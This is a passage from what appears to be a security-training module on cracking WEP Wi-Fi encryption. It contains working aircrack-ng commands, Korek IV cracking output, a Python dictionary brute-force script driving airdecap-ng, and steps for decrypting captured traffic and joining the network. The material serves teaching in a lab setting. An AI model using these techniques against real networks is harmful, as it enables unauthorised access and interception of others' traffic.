+    <span class="hljs-number">4</span>    <span class="hljs-number">0</span>/  <span class="hljs-number">1</span>   <span class="hljs-number">97(34816</span>) <span class="hljs-number">1</span>C(<span class="hljs-number">34048</span>) F<span class="hljs-number">3(34048</span>) AD(<span class="hljs-number">33280</span>) <span class="hljs-number">61(33024</span>) <span class="hljs-number">3</span>C(<span class="hljs-number">32768</span>) <span class="hljs-number">84(32768</span>) <span class="hljs-number">02(32512</span>) 
+
+                         <span class="hljs-keyword">KEY</span> FOUND! [ <span class="hljs-number">26</span>:<span class="hljs-number">27</span>:F6:<span class="hljs-number">85</span>:<span class="hljs-number">97</span> ] 
+        Decrypted correctly: <span class="hljs-number">100</span>%
+</code></pre>
+<p>It is worth noting that fake authentication is mostly only effective with older routers, as newer routers do not generate broadcast requests when connected via fake authentication.</p>
+<p>Attacks on the access point can be done in many different ways, with the typical aim of retrieving the PRGA keystream and key. In the next section, we will explore advanced WEP cracking techniques.</p>
+<hr>
+<h2 id="additional-wep-cracking">Additional WEP Cracking</h2>
+<hr>
+<p>In this section, we will cover additional methods of cracking WEP. First, we’ll expand on the classic approach of using captured initialization vectors (IVs) from <code>airodump-ng</code>. Then, we’ll explore how to perform a mostly-offline dictionary attack with Python, requiring minimal captured data. The script will use <a href="https://www.aircrack-ng.org/doku.php?id=airdecap-ng">airdecap-ng</a> and a password list to perform a brute-force attack, ultimately revealing the WEP key. These methods reinforce just how fragile WEP encryption is, and why it’s essential to move towards more secure protocols.</p>
+<hr>
+<p><strong>Aircrack-ng Benchmark</strong></p>
+<p>By now, we know <code>aircrack-ng</code> is a powerful tool designed for network security testing, capable of cracking WEP and WPA/WPA2 networks that use pre-shared keys or PMKID. As an offline attack tool, it works with captured packets and does not need direct interaction with any Wi-Fi device.</p>
+<p>Prior to commencing password/key cracking with aircrack-ng, it may be beneficial to assess the benchmark of the host system, so we may ensure its ability to execute brute-force attacks effectively. For this, we will use the built-in benchmark mode, supplying the <code>-S</code> option to test CPU performance.</p>
+<p>  Additional WEP Cracking</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ aircrack-ng -S
+
+<span class="hljs-number">1628.101</span> k/s
+</code></pre>
+<p>The above output estimates that our CPU can crack approximately 1,628.101 passphrases per second. Since <code>aircrack-ng</code> fully utilizes the CPU, the cracking speed can decrease significantly if other demanding tasks are also running on the system.</p>
+<hr>
+<p><strong>Korek WEP Cracking</strong></p>
+<p>As we've seen in previous sections, <code>aircrack-ng</code> is capable of recovering the WEP key once a sufficient number of encrypted packets have been captured using <code>airodump-ng</code>. The <code>-w</code> option in <code>airodump-ng</code> saves the traffic into a <code>.cap</code> file. However, it is also possible to save only the captured initialization vectors using the <code>--ivs</code> option. Once enough IVs are captured, we can utilize the <code>-K</code> option in aircrack-ng, which invokes the Korek WEP cracking method to crack the WEP key.</p>
+<p>  Additional WEP Cracking</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ aircrack-ng -K HTB.ivs 
+
+Reading packets, please wait...
+Opening HTB.ivs
+Read<span class="hljs-number"> 567298 </span>packets.
+
+   <span class="hljs-comment">#  BSSID              ESSID                     Encryption</span>
+
+  <span class="hljs-number"> 1 </span> B1:A3:94:21:7F:1A                            WEP (0 IVs)
+
+Choosing first network as target.
+
+Reading packets, please wait...
+Opening HTB.ivs
+Read<span class="hljs-number"> 567298 </span>packets.
+
+1 potential targets
+
+                                             Aircrack-ng 1.6 
+
+
+                               [00:00:17] Tested<span class="hljs-number"> 1741 </span>keys (got<span class="hljs-number"> 566693 </span>IVs)
+
+   KB    depth   byte(vote)
+   <span class="hljs-number"> 0 </span>   0/ <span class="hljs-number"> 1 </span>  AB(  50) 11(  20) 71(  20) 0D(  12) 10(  12) 68(  12) 84(  12) 0A(   9) 
+   <span class="hljs-number"> 1 </span>   1/ <span class="hljs-number"> 2 </span>  C7(  31) BD(  18) F8(  17) E6(  16) 35(  15) 7A(  13) 7F(  13) 81(  13) 
+   <span class="hljs-number"> 2 </span>   0/ <span class="hljs-number"> 3 </span>  7F(  31) 74(  24) 54(  17) 1C(  13) 73(  13) 86(  12) 1B(  10) BF(  10) 
+   <span class="hljs-number"> 3 </span>   0/ <span class="hljs-number"> 1 </span>  3A( 148) EC(  20) EB(  16) FB(  13) 81(  12) D7(  12) ED(  12) F0(  12) 
+   <span class="hljs-number"> 4 </span>   0/ <span class="hljs-number"> 1 </span>  03( 140) 90(  31) 4A(  15) 8F(  14) E9(  13) AD(  12) 86(  10) DB(  10) 
+   <span class="hljs-number"> 5 </span>   0/ <span class="hljs-number"> 1 </span>  D0(  69) 04(  27) 60(  24) C8(  24) 26(  20) A1(  20) A0(  18) 4F(  17) 
+   <span class="hljs-number"> 6 </span>   0/ <span class="hljs-number"> 1 </span>  AF( 124) D4(  29) C8(  20) EE(  18) 3F(  12) 54(  12) 3C(  11) 90(  11) 
+   <span class="hljs-number"> 7 </span>   0/ <span class="hljs-number"> 1 </span>  DA( 168) 90(  24) 72(  22) F5(  21) 11(  20) F1(  20) 86(  17) FB(  16) 
+   <span class="hljs-number"> 8 </span>   0/ <span class="hljs-number"> 1 </span>  F6( 157) EE(  24) 66(  20) DA(  18) E0(  18) EA(  18) 82(  17) 11(  16) 
+   <span class="hljs-number"> 9 </span>   1/ <span class="hljs-number"> 2 </span>  7B(  44) E2(  30) 11(  27) DE(  23) A4(  20) 66(  19) E9(  18) 64(  17) 
+  <span class="hljs-number"> 10 </span>   1/ <span class="hljs-number"> 1 </span>  01(   0) 02(   0) 03(   0) 04(   0) 05(   0) 06(   0) 07(   0) 08(   0) 
+
+             KEY FOUND! [ AB:C7:7F:3A:03:D0:AF:DA:F6:8D:A5:E2:C7 ] 
+    Decrypted correctly: 100%
+</code></pre>
+<hr>
+<h4 id="bruteforce-wep-cracking">Bruteforce WEP cracking</h4>
+<p>When attempting to crack WEP encryption, attackers typically gather enough encrypted packets using tools like <code>airodump-ng</code> and then use <code>aircrack-ng</code> to successfully decipher the key. However, there are situations where the available packet count isn't sufficient for online cracking. In such cases, the attacker may switch to an offline approach, using <code>dictionary</code> or <code>brute-force</code> methods to try and break the key.</p>
+<p><img src="storage\modules\185\Airdecap\wep_original.png" alt="Wireshark capture showing IEEE 802.11 frames with SSID 'HackTheBox'. Details include beacon frame, source and destination addresses, protocol 802.11, and tagged parameters like supported rates and channel."></p>
+<p>As shown in the above screenshot, we have captured a small amount of data using <code>airodump-ng</code>, which is not enough to generate sufficient IVs for cracking WEP encryption. To perform a brute-force attack, we can attempt to decrypt the packet using <code>airdecap-ng</code> with each password from the list. If a packet is successfully decrypted, it indicates that we have found the correct WEP key.</p>
+<p>We can write a Python script that converts each 5-character password from the password list into its hexadecimal equivalent and then uses a loop to test each one with <code>airdecap-ng</code> to check if it successfully decrypts the traffic.</p>
+<p>Code: python</p>
+<pre><code class="lang-python"><span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">import</span> binascii
+<span class="hljs-keyword">import</span> re
+<span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> Popen, PIPE
+<span class="hljs-keyword">import</span> time
+
+<span class="hljs-comment"># Start timer</span>
+start_time = time.time()
+
+<span class="hljs-comment"># File paths</span>
+cap_file = <span class="hljs-string">'/opt/WEP-01.cap'</span>
+wordlist_path = <span class="hljs-string">'/opt/1000000-password-seclists.txt'</span>
+wordlist = []
+
+<span class="hljs-comment"># Read wordlist file to a list</span>
+<span class="hljs-keyword">with</span> open(wordlist_path, <span class="hljs-string">'r'</span>) <span class="hljs-keyword">as</span> f:
+    wordlist = f.readlines()
+
+<span class="hljs-comment"># Iterate over the wordlist</span>
+<span class="hljs-keyword">for</span> ln, word <span class="hljs-keyword">in</span> enumerate(wordlist, start=<span class="hljs-number">1</span>):
+    <span class="hljs-comment"># Clean the line to remove non-alphanumeric characters</span>
+    key = re.sub(<span class="hljs-string">r'\W+'</span>, <span class="hljs-string">''</span>, word)
+
+    <span class="hljs-comment"># Filter wordlist to only keep 5-character long words</span>
+    <span class="hljs-keyword">if</span> len(key) != <span class="hljs-number">5</span> :
+        <span class="hljs-keyword">continue</span>
+
+    <span class="hljs-comment"># Encode the WEP key to bytes and convert to hexadecimal</span>
+    hex_key = binascii.hexlify(key.encode(<span class="hljs-string">'utf-8'</span>))
+
+    <span class="hljs-comment"># Print the current attempt</span>
+    print(f<span class="hljs-string">"{ln}: Trying Key: {key} Hex: {hex_key}"</span>)
+
+    <span class="hljs-comment"># Run airdecap-ng with the current WEP key</span>
+    p = Popen([<span class="hljs-string">'/usr/bin/airdecap-ng'</span>, <span class="hljs-string">'-w'</span>, hex_key, cap_file], stdout=PIPE)
+    output = p.stdout.read().decode(<span class="hljs-string">"utf-8"</span>)
+
+    <span class="hljs-comment"># Check if the key was successful</span>
+    <span class="hljs-keyword">if</span> int(output.split(<span class="hljs-string">'\n'</span>)[<span class="hljs-number">5</span>][<span class="hljs-number">-1</span>]) &gt; <span class="hljs-number">0</span>:
+        print(f<span class="hljs-string">"Success! WEP key found: {key}"</span>)
+        end_time = time.time()
+        print(f<span class="hljs-string">"Total time: {end_time - start_time:.6f} seconds"</span>)
+        sys.exit(<span class="hljs-number">0</span>)
+
+<span class="hljs-comment"># If no key was found</span>
+print(<span class="hljs-string">"No WEP key found"</span>)
+</code></pre>
+<p>In the above Python script, the capture file <code>WEP-01.cap</code> is assigned to the <code>capture_file</code> variable, while the password list is loaded into the <code>wordlist</code> variable. The script then iterates through the list of passwords in a for-loop, using <code>airdecap-ng</code> to test each one. Afterwards, the script checks the output for the line containing <code>'Number of decrypted WEP packets'</code>. If the number of decrypted packets is greater than 0, it indicates that the packet was successfully decrypted and the correct WEP key has been found.</p>
+<p>  Additional WEP Cracking</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ python3 bruteforce.py 
+<span class="hljs-symbol">
+6:</span> Trying <span class="hljs-string">Key:</span> b<span class="hljs-string">'12345'</span> <span class="hljs-string">Hex:</span> b<span class="hljs-string">'3132333435'</span>
+<span class="hljs-number">27</span>: Trying <span class="hljs-string">Key:</span> b<span class="hljs-string">'empty'</span> <span class="hljs-string">Hex:</span> b<span class="hljs-string">'656d707479'</span>
+<span class="hljs-number">125</span>: Trying <span class="hljs-string">Key:</span> b<span class="hljs-string">'11111'</span> <span class="hljs-string">Hex:</span> b<span class="hljs-string">'3131313131'</span>
+<span class="hljs-number">182</span>: Trying <span class="hljs-string">Key:</span> b<span class="hljs-string">'money'</span> <span class="hljs-string">Hex:</span> b<span class="hljs-string">'6d6f6e6579'</span>
+<span class="hljs-number">220</span>: Trying <span class="hljs-string">Key:</span> b<span class="hljs-string">'angel'</span> <span class="hljs-string">Hex:</span> b<span class="hljs-string">'616e67656c'</span>
+<span class="hljs-number">227</span>: Trying <span class="hljs-string">Key:</span> b<span class="hljs-string">'enter'</span> <span class="hljs-string">Hex:</span> b<span class="hljs-string">'656e746572'</span>
+<span class="hljs-number">229</span>: Trying <span class="hljs-string">Key:</span> b<span class="hljs-string">'chris'</span> <span class="hljs-string">Hex:</span> b<span class="hljs-string">'6368726973'</span>
+<span class="hljs-number">245</span>: Trying <span class="hljs-string">Key:</span> b<span class="hljs-string">'james'</span> <span class="hljs-string">Hex:</span> b<span class="hljs-string">'6a616d6573'</span>
+<span class="hljs-number">263</span>: Trying <span class="hljs-string">Key:</span> b<span class="hljs-string">'floor'</span> <span class="hljs-string">Hex:</span> b<span class="hljs-string">'666c6f6f72'</span>
+<span class="hljs-number">279</span>: Trying <span class="hljs-string">Key:</span> b<span class="hljs-string">'tiger'</span> <span class="hljs-string">Hex:</span> b<span class="hljs-string">'7469676572'</span>
+<span class="hljs-number">284</span>: Trying <span class="hljs-string">Key:</span> b<span class="hljs-string">'55555'</span> <span class="hljs-string">Hex:</span> b<span class="hljs-string">'3535353535'</span>
+&lt;SNIP&gt;
+<span class="hljs-number">49910</span>: Trying <span class="hljs-string">Key:</span> b<span class="hljs-string">'crass'</span> <span class="hljs-string">Hex:</span> b<span class="hljs-string">'6372617373'</span>
+<span class="hljs-number">49921</span>: Trying <span class="hljs-string">Key:</span> b<span class="hljs-string">'conni'</span> <span class="hljs-string">Hex:</span> b<span class="hljs-string">'636f6e6e69'</span>
+<span class="hljs-number">49950</span>: Trying <span class="hljs-string">Key:</span> b<span class="hljs-string">'cious'</span> <span class="hljs-string">Hex:</span> b<span class="hljs-string">'63696f7573'</span>
+<span class="hljs-number">49951</span>: Trying <span class="hljs-string">Key:</span> b<span class="hljs-string">'chupa'</span> <span class="hljs-string">Hex:</span> b<span class="hljs-string">'6368757061'</span>
+<span class="hljs-number">49965</span>: Trying <span class="hljs-string">Key:</span> b<span class="hljs-string">'chiar'</span> <span class="hljs-string">Hex:</span> b<span class="hljs-string">'6368696172'</span>
+<span class="hljs-number">49972</span>: Trying <span class="hljs-string">Key:</span> b<span class="hljs-string">'cheek'</span> <span class="hljs-string">Hex:</span> b<span class="hljs-string">'636865656b'</span>
+Success! WEP key <span class="hljs-string">found:</span> b<span class="hljs-string">'cheek'</span>
+Total <span class="hljs-string">time:</span> <span class="hljs-number">6.088396</span> seconds
+</code></pre>
+<p>As demonstrated in the output above, the brute-force process successfully identified the password as <code>cheek</code>. Its corresponding hexadecimal value is <code>636865656b</code>.</p>
+<p>With the correct key in hand, we can now decrypt any WEP-encrypted data captured during the session using <code>airdecap-ng</code>, allowing further analysis of network traffic using tools like Wireshark.</p>
+<p>  Additional WEP Cracking</p>
+<pre><code class="lang-shell-session"><span class="hljs-type">root</span>@htb[/htb]$ airdecap-ng -w <span class="hljs-number">636865656</span>b <span class="hljs-type">WEP</span><span class="hljs-number">-01.</span>cap 
+
+<span class="hljs-type">Total</span> number <span class="hljs-keyword">of</span> stations seen            <span class="hljs-number">2</span>
+<span class="hljs-type">Total</span> number <span class="hljs-keyword">of</span> packets read             <span class="hljs-number">9</span>
+<span class="hljs-type">Total</span> number <span class="hljs-keyword">of</span> <span class="hljs-type">WEP</span> <span class="hljs-class"><span class="hljs-keyword">data</span> packets         7</span>
+<span class="hljs-type">Total</span> number <span class="hljs-keyword">of</span> <span class="hljs-type">WPA</span> <span class="hljs-class"><span class="hljs-keyword">data</span> packets         0</span>
+<span class="hljs-type">Number</span> <span class="hljs-keyword">of</span> plaintext <span class="hljs-class"><span class="hljs-keyword">data</span> packets         0</span>
+<span class="hljs-type">Number</span> <span class="hljs-keyword">of</span> decrypted <span class="hljs-type">WEP</span>  packets         <span class="hljs-number">7</span>
+<span class="hljs-type">Number</span> <span class="hljs-keyword">of</span> corrupted <span class="hljs-type">WEP</span>  packets         <span class="hljs-number">0</span>
+<span class="hljs-type">Number</span> <span class="hljs-keyword">of</span> decrypted <span class="hljs-type">WPA</span>  packets         <span class="hljs-number">0</span>
+<span class="hljs-type">Number</span> <span class="hljs-keyword">of</span> bad <span class="hljs-type">TKIP</span> (<span class="hljs-type">WPA</span>) packets         <span class="hljs-number">0</span>
+<span class="hljs-type">Number</span> <span class="hljs-keyword">of</span> bad <span class="hljs-type">CCMP</span> (<span class="hljs-type">WPA</span>) packets         <span class="hljs-number">0</span>
+</code></pre>
+<p>After successfully decrypting the WEP traffic with airdecap-ng, a new file will be generated, typically named something similar to <code>WEP-01-dec.cap</code>.</p>
+<p>Opening this file in Wireshark reveals that the traffic has indeed been decrypted. We can now view the plaintext content, including network protocols, payload data, and any other information that once veiled by ciphertext.</p>
+<p><img src="storage\modules\185\Airdecap\wep_decrypt.png" alt="Wireshark capture showing ARP and ICMP packets. ARP requests for IP 192.168.1.1 and 192.168.1.23. ICMP echo request and reply between 192.168.1.1 and 192.168.1.23."></p>
+<p>We can also use the WEP key <code>'636865656b'</code> to connect to the Wi-Fi network.</p>
+<hr>
+<h3 id="closing-thoughts">Closing Thoughts</h3>
+<p>WEP (Wired Equivalent Privacy) serves as a cautionary tale in network security, illustrating the critical importance of robust encryption methods. Its well-documented vulnerabilities highlight the necessity of transitioning to stronger standards like WPA2 and WPA3. As we advance through our infosec journey, the lessons learned from WEP remind us to prioritize ongoing improvement and vigilance.</p>
+<hr>
+</div></div></body></html>
